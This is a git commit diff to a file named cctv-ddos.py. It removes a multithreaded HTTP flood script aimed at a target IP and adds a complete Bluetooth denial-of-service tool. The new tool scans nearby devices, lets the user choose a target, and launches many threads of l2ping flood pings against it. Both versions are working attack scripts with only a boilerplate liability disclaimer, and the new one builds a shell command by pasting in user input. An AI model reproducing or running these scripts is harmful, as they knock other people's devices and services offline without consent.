5274f0a7092865156932a164f5aa778f1105e69f
BuduruNaveen <147520798+BuduruNaveen@users.noreply.github.com>
2024-05-16 21:18:04 +0530

    Bluetooth.py

--- cctv-ddos.py
+++ cctv-ddos.py
@@ -1,20 +1,85 @@
-import socket
+import os
 import threading
+import time
+import subprocess
+def DOS(target_addr, packages_size):
+    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)
 
-# Target information
-target_ip = "192.168.1.1"  # Replace with the target IP
-target_port = 80          # Replace with the target port
-fake_ip = "10.10.10.10"   # Replace with a fake IP address
+def printLogo():
+    print('                            Bluetooth DOS Script                            ')
+def main():
+    printLogo()
+    time.sleep(0.1)
+    print('')
+    print('\x1b[31mTHIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.')
+    if (input("Do you agree? (y/n) > ") in ['y', 'Y']):
+        time.sleep(0.1)
+        os.system('clear')
+        printLogo()
+        print('')
+        print("Scanning ...")
+        output = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)
+        lines = output.splitlines()
+        id = 0
+        del lines[0]
+        array = []
+        print("|id   |   mac_addres  |   device_name|")
+        for line in lines:
+            info = line.split()
+            mac = info[0]
+            array.append(mac)
+            print(f"|{id}   |   {mac}  |   {''.join(info[1:])}|")
+            id = id + 1
+        target_id = input('Target id or mac > ')
+        try:
+            target_addr = array[int(target_id)]
+        except:
+            target_addr = target_id
 
-def attack():
-    while True:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target_ip, target_port))
-        s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
-        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
-        s.close()
 
-# Start multiple threads
-for i in range(500):
-    thread = threading.Thread(target=attack)
-    thread.start()
+        if len(target_addr) < 1:
+            print('[!] ERROR: Target addr is missing')
+            exit(0)
+
+        try:
+            packages_size = int(input('Packages size > '))
+        except:
+            print('[!] ERROR: Packages size must be an integer')
+            exit(0)
+        try:
+            threads_count = int(input('Threads count > '))
+        except:
+            print('[!] ERROR: Threads count must be an integer')
+            exit(0)
+        print('')
+        os.system('clear')
+
+        print("\x1b[31m[*] Starting DOS attack in 3 seconds...")
+
+        for i in range(0, 3):
+            print('[*] ' + str(3 - i))
+            time.sleep(1)
+        os.system('clear')
+        print('[*] Building threads...\n')
+
+        for i in range(0, threads_count):
+            print('[*] Built thread №' + str(i + 1))
+            threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()
+
+        print('[*] Built all threads...')
+        print('[*] Starting...')
+    else:
+        print('Bip bip')
+        exit(0)
+
+if __name__ == '__main__':
+    try:
+        os.system('clear')
+        main()
+    except KeyboardInterrupt:
+        time.sleep(0.1)
+        print('\n[*] Aborted')
+        exit(0)
+    except Exception as e:
+        time.sleep(0.1)
+        print('[!] ERROR: ' + str(e))
